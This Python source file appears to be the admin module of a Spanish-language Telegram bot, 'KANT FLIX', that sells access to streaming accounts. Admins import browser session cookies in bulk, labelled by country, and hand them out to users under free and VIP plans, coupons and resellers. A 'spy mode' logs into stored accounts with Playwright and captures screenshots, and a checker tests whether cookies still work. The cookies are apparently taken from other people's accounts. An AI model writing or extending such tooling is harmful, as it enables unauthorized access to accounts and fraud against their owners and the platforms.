import os
import time
import json
import threading
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import config
from config import bot, SUPER_ADMIN_ID, MAX_USES_PER_COOKIE
import database
from database import init_db, save_db, is_admin
import utils
from utils import auto_repair_system, generate_coupon_code, parse_netscape_cookies
import keyboards
from keyboards import admin_panel_keyboard, admin_reseller_keyboard
from playwright_service import background_check_cookies, background_spy

# Función para el teclado de planes (movida aquí para evitar el ImportError)
def admin_plans_keyboard(db):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✏️ Editar Límite Gratis", callback_data="admin_edit_plan_free"))
    markup.add(InlineKeyboardButton("✏️ Editar Límite VIP", callback_data="admin_edit_plan_vip"))
    markup.add(InlineKeyboardButton("🔙 Volver", callback_data="admin_back_panel"))
    return markup

@bot.message_handler(commands=['admin'])
@bot.message_handler(func=lambda m: m.text == "👑 Panel Admin")
def admin_panel_start(message):
    if not is_admin(message.from_user.id): return
    db = init_db()
    bot.send_message(message.chat.id, "👑 **CENTRO DE MANDOS KANT FLIX** 👑", reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

@bot.message_handler(commands=['activaciones'])
def command_all_activations(message):
    if not is_admin(message.from_user.id): return
    db = init_db()
    profiles = db.get('user_profiles', {})
    
    sorted_users = sorted(profiles.items(), key=lambda x: x[1].get('activations', 0), reverse=True)
    
    texto_actual = "📈 **LISTA GLOBAL DE ACTIVACIONES POR USUARIO** 📈\n\n"
    count_cero = 0
    
    bot.send_message(message.chat.id, "📊 Generando reporte completo de todos los usuarios... Esto puede tomar un segundo.", parse_mode="Markdown")
    
    for i, (uid, prof) in enumerate(sorted_users):
        acts = prof.get('activations', 0)
        if acts > 0:
            linea = f"👤 @{prof.get('username','N/A')} (`{uid}`) ➔ **{acts} activaciones**\n"
            
            if len(texto_actual) + len(linea) > 3800:
                bot.send_message(message.chat.id, texto_actual, parse_mode="Markdown")
                texto_actual = linea
            else:
                texto_actual += linea
        else:
            count_cero += 1
            
    if count_cero > 0:
        texto_actual += f"\n_... además hay {count_cero} usuarios registrados que aún tienen 0 activaciones._"
         
    if texto_actual.strip() == "📈 **LISTA GLOBAL DE ACTIVACIONES POR USUARIO** 📈":
        texto_actual += "\n_Ningún usuario ha activado nada aún._"
        
    bot.send_message(message.chat.id, texto_actual, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id): return
    db = init_db()
    
    try:
        if call.data == "admin_create_coupon":
            msg = bot.send_message(call.message.chat.id, "🎟️ ¿Cuántos **DÍAS VIP** otorgará este cupón? (Ej: 30)")
            bot.register_next_step_handler(msg, process_create_coupon)
            
        elif call.data == "admin_manage_plans":
            texto = f"💎 **Gestor de Planes**\n\n🆓 **Gratis:** {db['plans']['free']['daily_limit']}/día\n👑 **VIP:** {db['plans']['vip']['daily_limit']}/día\n\nSelecciona:"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_plans_keyboard(db), parse_mode="Markdown")
            
        elif call.data == "admin_edit_plan_free":
            msg = bot.send_message(call.message.chat.id, "✏️ Envía el **NUEVO NÚMERO** de usos al día para GRATIS:")
            bot.register_next_step_handler(msg, lambda m: _edit_plan_limit(m, 'free'))

        elif call.data == "admin_edit_plan_vip":
            msg = bot.send_message(call.message.chat.id, "✏️ Envía el **NUEVO NÚMERO** de usos al día para VIP:")
            bot.register_next_step_handler(msg, lambda m: _edit_plan_limit(m, 'vip'))
            
        elif call.data == "admin_back_panel":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="👑 **CENTRO DE MANDOS KANT FLIX** 👑", reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

        elif call.data == "admin_manage_users":
            msg = bot.send_message(call.message.chat.id, "💳 Envía la **ID del usuario** para gestionarlo:")
            bot.register_next_step_handler(msg, process_manage_user)

        elif call.data == "admin_status":
            activas = sum(1 for c in db['cookies_list'] if c['status'] == 'active')
            texto = f"📊 **Cuentas Activas:** {activas}\n\n"
            for i, c in enumerate(db['cookies_list']):
                if c['status'] == 'active':
                    texto += f"#{i+1} ({c.get('country','N/A')}) - Usos: {c['uses']}/{MAX_USES_PER_COOKIE}\n"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db))
            
        elif call.data == "admin_spy_menu":
            markup = InlineKeyboardMarkup()
            for i, c in enumerate(db['cookies_list']):
                if c['status'] == 'active':
                    markup.add(InlineKeyboardButton(f"📸 Cuenta #{i+1} ({c.get('country')})", callback_data=f"spy_{i}"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="📸 **MODO ESPÍA (Selecciona cuenta a capturar)**", reply_markup=markup, parse_mode="Markdown")

        elif call.data == "admin_add_cookie":
            msg = bot.send_message(call.message.chat.id, "🌍 ¿De qué país es la cuenta? (Ej: España, USA):")
            bot.register_next_step_handler(msg, process_add_cookie_country)

        elif call.data == "admin_bulk_import":
            msg = bot.send_message(call.message.chat.id, "📥 ¿De qué país es el LOTE entero?:")
            bot.register_next_step_handler(msg, process_bulk_country)

        elif call.data == "admin_check":
            bot.answer_callback_query(call.id, "🔍 Iniciando diagnóstico... Recibirás el reporte por aquí.")
            threading.Thread(target=background_check_cookies, args=(call.message.chat.id,)).start()

        elif call.data == "admin_manage_admins":
            if call.from_user.id != SUPER_ADMIN_ID: return
            markup = InlineKeyboardMarkup()
            for admin_id in db['admins']:
                markup.add(InlineKeyboardButton(f"ID: {admin_id}", callback_data="noop"), InlineKeyboardButton("❌ Quitar", callback_data=f"del_admin_{admin_id}"))
            markup.add(InlineKeyboardButton("➕ Añadir Nuevo Admin", callback_data="add_new_admin"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="👥 **Gestión de Administradores**", reply_markup=markup, parse_mode="Markdown")

        elif call.data == "admin_top_refs":
            profiles = db.get('user_profiles', {})
            sorted_users = sorted(profiles.items(), key=lambda x: x[1].get('referrals', 0), reverse=True)[:10]
            texto = "🏆 **TOP 10 REFERIDORES** 🏆\n\n"
            for i, (uid, prof) in enumerate(sorted_users):
                if prof.get('referrals', 0) > 0:
                    texto += f"{i+1}. @{prof.get('username','N/A')} - **{prof.get('referrals')} invitados**\n"
            if texto == "🏆 **TOP 10 REFERIDORES** 🏆\n\n": texto += "_Nadie ha invitado a nadie aún._"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

        elif call.data == "admin_top_acts":
            bot.answer_callback_query(call.id, "📊 Recopilando historial completo de activaciones de cada usuario...")
            profiles = db.get('user_profiles', {})
            
            sorted_users = sorted(profiles.items(), key=lambda x: x[1].get('activations', 0), reverse=True)
            
            texto_base = "📈 **REPORTE COMPLETO DE ACTIVACIONES** 📈\n\n"
            texto_actual = texto_base
            mensajes_enviados = 0
            count_cero = 0
            hay_activaciones = False
            
            for i, (uid, prof) in enumerate(sorted_users):
                acts = prof.get('activations', 0)
                if acts > 0:
                    hay_activaciones = True
                    linea = f"{i+1}. @{prof.get('username','N/A')} (ID: `{uid}`) - **{acts} activaciones**\n"
                    
                    if len(texto_actual) + len(linea) > 3800:
                        if mensajes_enviados == 0:
                            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto_actual, parse_mode="Markdown")
                        else:
                            bot.send_message(call.message.chat.id, texto_actual, parse_mode="Markdown")
                        texto_actual = linea
                        mensajes_enviados += 1
                    else:
                        texto_actual += linea
                else:
                    count_cero += 1
            
            if not hay_activaciones:
                texto_actual += "_Nadie ha activado nada aún._\n"
            
            if count_cero > 0:
                texto_actual += f"\n_... y {count_cero} usuarios que aún tienen 0 activaciones._"
                
            if mensajes_enviados == 0:
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto_actual, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")
            else:
                bot.send_message(call.message.chat.id, texto_actual, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

        elif call.data == "admin_broadcast":
            msg = bot.send_message(call.message.chat.id, "📢 Envía el mensaje que le llegará a TODOS los usuarios:")
            bot.register_next_step_handler(msg, process_broadcast)
            
        elif call.data == "admin_backup":
            if os.path.exists('database.json'):
                with open('database.json', 'rb') as doc:
                    bot.send_document(call.message.chat.id, doc, caption="💾 Backup BD Actual")

        elif call.data == "admin_restore":
            msg = bot.send_message(call.message.chat.id, "📤 **RESTAURAR BASE DE DATOS**\n\nEnvíame el archivo `database.json` directamente por aquí para restaurar todo. (¡Asegúrate de enviar el archivo correcto!)", parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_restore_db)
                    
        elif call.data == "admin_export_users":
            with open('users_export.txt', 'w', encoding='utf-8') as f:
                f.write("ID | Username | Nombre | Plan | Ref | Activaciones | Fecha Ingreso\n")
                f.write("-" * 90 + "\n")
                for uid, p in db['user_profiles'].items():
                    f.write(f"{uid} | @{p.get('username','N/A')} | {p.get('first_name','N/A')} | {p.get('plan')} | {p.get('referrals')} | {p.get('activations', 0)} | {p.get('first_seen')}\n")
            with open('users_export.txt', 'rb') as doc:
                bot.send_document(call.message.chat.id, doc, caption="📄 Lista Completa de Usuarios")
            os.remove('users_export.txt')
                    
        elif call.data == "admin_bans":
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔨 Banear ID", callback_data="ban_user"), InlineKeyboardButton("🕊️ Desbanear ID", callback_data="unban_user"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🛡️ **Panel de Bloqueos**", reply_markup=markup, parse_mode="Markdown")

        elif call.data == "admin_clear_dead_cookies":
            initial = len(db['cookies_list'])
            db['cookies_list'] = [c for c in db['cookies_list'] if c['status'] == 'active']
            deleted = initial - len(db['cookies_list'])
            save_db(db)
            bot.answer_callback_query(call.id, f"🧹 Limpieza: {deleted} cuentas agotadas eliminadas.", show_alert=True)

        elif call.data == "admin_clear_cache":
            auto_repair_system()
            bot.answer_callback_query(call.id, "⚙️ Servidor purgado y RAM liberada con éxito.", show_alert=True)
            
        elif call.data == "admin_toggle_maint":
            db['maintenance_mode'] = not db.get('maintenance_mode', False)
            save_db(db)
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=admin_panel_keyboard(db))

        elif call.data == "admin_reseller_menu":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="💼 **Gestión de Revendedores**\n\nAquí puedes autorizar a otros usuarios a vender cupones por ti a cambio de créditos.", reply_markup=admin_reseller_keyboard(), parse_mode="Markdown")

        elif call.data == "admin_reseller_add":
            msg = bot.send_message(call.message.chat.id, "🆔 Envía la **ID del usuario** seguido de los **Créditos** que le quieres dar.\n\n_Ejemplo:_ `123456789 50` _(Le da 50 créditos)_", parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_add_reseller)
            
        elif call.data == "admin_reseller_list":
            if 'resellers' not in db or not db['resellers']:
                bot.answer_callback_query(call.id, "No hay revendedores registrados todavía.", show_alert=True)
                return
            texto = "💼 **LISTA DE REVENDEDORES** 💼\n\n"
            for r_id, r_data in db['resellers'].items():
                texto += f"👤 ID: `{r_id}`\n💰 Créditos actuales: **{r_data.get('credits',0)}**\n🎟️ Cupones generados: {r_data.get('total_created',0)}\n\n"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

    except Exception as e:
        bot.answer_callback_query(call.id, "❌ Error en el panel.")
        print(e)

def _edit_plan_limit(message, plan_type):
    try:
        new_limit = int(message.text.strip())
        db = init_db()
        db['plans'][plan_type]['daily_limit'] = new_limit
        save_db(db)
        bot.reply_to(message, f"✅ Límite para el plan **{plan_type.upper()}** actualizado a: `{new_limit}` por día.", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Por favor, envía un número entero válido.")

def process_create_coupon(message):
    try:
        days = int(message.text.strip())
        db = init_db()
        code = generate_coupon_code(days)
        db['coupons'][code] = {'days': days}
        save_db(db)
        bot.reply_to(message, f"✅ **CUPÓN GENERADO**\n\n🎟️ Código: `{code}`\n⏳ Duración: {days} días VIP\n\nPuedes vender o enviar este código al cliente.", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Por favor, envía un número de días válido.")

def process_manage_user(message):
    uid = message.text.strip()
    db = init_db()
    if uid in db['user_profiles']:
        user_data = db['user_profiles'][uid]
        acts = user_data.get('activations', 0)
        
        texto = f"👤 Usuario @{user_data.get('username')}.\n"
        texto += f"📈 **Activaciones totales hechas por este usuario:** {acts}\n\n"
        texto += "Escribe `VIP 30` para darle 30 días VIP.\nEscribe `FREE` para quitarle el VIP."
        
        msg = bot.reply_to(message, texto, parse_mode="Markdown")
        bot.register_next_step_handler(msg, lambda m: process_manage_user_action(m, uid))
    else:
        bot.reply_to(message, "❌ ID no encontrada.")

def process_manage_user_action(message, uid):
    text = message.text.strip().upper().split()
    db = init_db()
    try:
        action = text[0]
        if action == "VIP":
            amount = int(text[1])
            new_expiry = datetime.now() + timedelta(days=amount)
            db['user_profiles'][uid]['plan'] = 'vip'
            db['user_profiles'][uid]['vip_expiry'] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
            bot.reply_to(message, f"✅ Usuario {uid} convertido a VIP por {amount} días.")
            try: bot.send_message(uid, f"🎁 **¡El Administrador te ha activado {amount} días VIP!**")
            except: pass
        elif action == "FREE":
            db['user_profiles'][uid]['plan'] = 'free'
            db['user_profiles'][uid]['vip_expiry'] = None
            bot.reply_to(message, f"✅ Usuario {uid} degradado a plan Gratis.")
        save_db(db)
    except:
        bot.reply_to(message, "❌ Formato incorrecto.")

def process_add_reseller(message):
    try:
        parts = message.text.strip().split()
        uid = parts[0]
        credits = int(parts[1])
        db = init_db()
        if 'resellers' not in db: db['resellers'] = {}
        if uid not in db['resellers']: db['resellers'][uid] = {'credits': credits, 'total_created': 0, 'history': []}
        else: db['resellers'][uid]['credits'] += credits
        save_db(db)
        bot.reply_to(message, f"✅ **Revendedor Actualizado**\n\nEl usuario `{uid}` tiene ahora **{db['resellers'][uid]['credits']} créditos**.", parse_mode="Markdown")
        try: bot.send_message(int(uid), "💼 **¡Has recibido créditos de Revendedor!**\nYa puedes acceder a tu panel de reventa enviando el comando /reseller", parse_mode="Markdown")
        except: pass
    except:
        bot.reply_to(message, "❌ Formato incorrecto. Debes enviar: ID CRÉDITOS")

@bot.callback_query_handler(func=lambda call: call.data.startswith("spy_") or call.data.startswith("del_admin_") or call.data in ["add_new_admin", "ban_user", "unban_user", "noop"])
def manage_actions(call):
    db = init_db()
    if call.data == "noop": return
    if call.data.startswith("spy_"):
        idx = int(call.data.replace("spy_", ""))
        bot.answer_callback_query(call.id, "📸 Mandando ninja virtual...")
        wait_msg = bot.send_message(call.message.chat.id, f"🕵️‍♂️ Conectando a la cuenta #{idx+1} para hacer captura...")
        threading.Thread(target=background_spy, args=(call.message.chat.id, wait_msg.message_id, db['cookies_list'][idx]['data'])).start()
    elif call.data.startswith("del_admin_"):
        if call.from_user.id != SUPER_ADMIN_ID: return
        target = int(call.data.replace("del_admin_", ""))
        if target in db['admins']:
            db['admins'].remove(target); save_db(db)
            bot.answer_callback_query(call.id, "Admin eliminado.", show_alert=True)
    elif call.data == "add_new_admin":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del nuevo admin:")
        bot.register_next_step_handler(msg, lambda m: _add_admin(m))
    elif call.data == "ban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario a bloquear:")
        bot.register_next_step_handler(msg, lambda m: _ban_unban(m, True))
    elif call.data == "unban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario a perdonar:")
        bot.register_next_step_handler(msg, lambda m: _ban_unban(m, False))

def _add_admin(m):
    try:
        db = init_db(); db['admins'].append(int(m.text.strip())); save_db(db)
        bot.reply_to(m, "✅ Admin añadido con éxito.")
    except: pass

def _ban_unban(m, ban):
    try:
        db = init_db(); uid = int(m.text.strip())
        if ban: 
            if uid not in db['banned_users']: db['banned_users'].append(uid)
            bot.reply_to(m, "✅ Usuario bloqueado de por vida.")
        else: 
            if uid in db['banned_users']: db['banned_users'].remove(uid)
            bot.reply_to(m, "✅ Usuario desbaneado.")
        save_db(db)
    except: bot.reply_to(m, "❌ ID inválida.")

def process_add_cookie_country(m):
    country = m.text.strip().capitalize()
    msg = bot.send_message(m.chat.id, "🍪 Pega el texto (JSON o formato Checker/Netscape):")
    bot.register_next_step_handler(msg, lambda x: process_add_cookie_data(x, country))

def process_add_cookie_data(message, country):
    data = message.text.strip()
    try: 
        cookies = json.loads(data)
    except: 
        cookies = parse_netscape_cookies(data)
        
    if cookies:
        db = init_db()
        db['cookies_list'].append({'country': country, 'data': json.dumps(cookies) if isinstance(cookies, list) else cookies, 'uses': 0, 'status': 'active'})
        save_db(db); bot.reply_to(message, "✅ Cookie guardada con éxito en la bóveda.")
    else: bot.reply_to(message, "❌ Error de formato.")

def process_bulk_country(m):
    c = m.text.strip().capitalize()
    msg = bot.send_message(m.chat.id, "📥 Pega el JSON Array Gigante:")
    bot.register_next_step_handler(msg, lambda x: process_bulk_data(x, c))

def process_bulk_data(m, c):
    try:
        data = json.loads(m.text.strip())
        db = init_db(); added = 0
        for arr in data:
            db['cookies_list'].append({'country': c, 'data': json.dumps(arr), 'uses': 0, 'status': 'active'})
            added += 1
        save_db(db); bot.reply_to(m, f"✅ Lote importado: {added} cuentas nuevas.")
    except: bot.reply_to(m, "❌ Error importando. Asegúrate de que es un JSON válido.")

def process_broadcast(message):
    if not message.text:
        bot.reply_to(message, "❌ El mensaje debe ser de texto.")
        return

    db = init_db()
    count = 0
    bot.reply_to(message, "⏳ Enviando masivo... Esto puede tardar un poco dependiendo del número de usuarios.")
    for uid in db.get('user_profiles', {}).keys():
        try: 
            bot.send_message(int(uid), f"🔔 **MENSAJE DEL ADMINISTRADOR** 🔔\n\n{message.text}", parse_mode="Markdown")
            time.sleep(0.05)
            count += 1
        except Exception: 
            try:
                bot.send_message(int(uid), f"🔔 MENSAJE DEL ADMINISTRADOR 🔔\n\n{message.text}")
                time.sleep(0.05)
                count += 1
            except: pass
    bot.send_message(message.chat.id, f"✅ Mensaje completado. Recibido exitosamente por {count} usuarios.")

def process_restore_db(message):
    if not message.document:
        bot.reply_to(message, "❌ Debes enviar un archivo adjunto. Operación cancelada.")
        return

    if not message.document.file_name.endswith('.json'):
        bot.reply_to(message, "❌ El archivo debe ser `.json`. Operación cancelada.")
        return

    try:
        bot.reply_to(message, "⏳ Procesando e instalando la base de datos...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        new_db = json.loads(downloaded_file.decode('utf-8'))

        if 'user_profiles' not in new_db or 'cookies_list' not in new_db:
            bot.reply_to(message, "❌ El archivo JSON no tiene la estructura válida para este bot.")
            return

        db = init_db()
        db.clear()
        db.update(new_db)
        save_db(db) 
        bot.reply_to(message, "✅ **¡BASE DE DATOS RESTAURADA CON ÉXITO!**\n\nTodos los usuarios, referidos, planes VIP, cookies y configuraciones se han recuperado y aplicado al sistema al instante.", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error al restaurar la base de datos: {str(e)}")
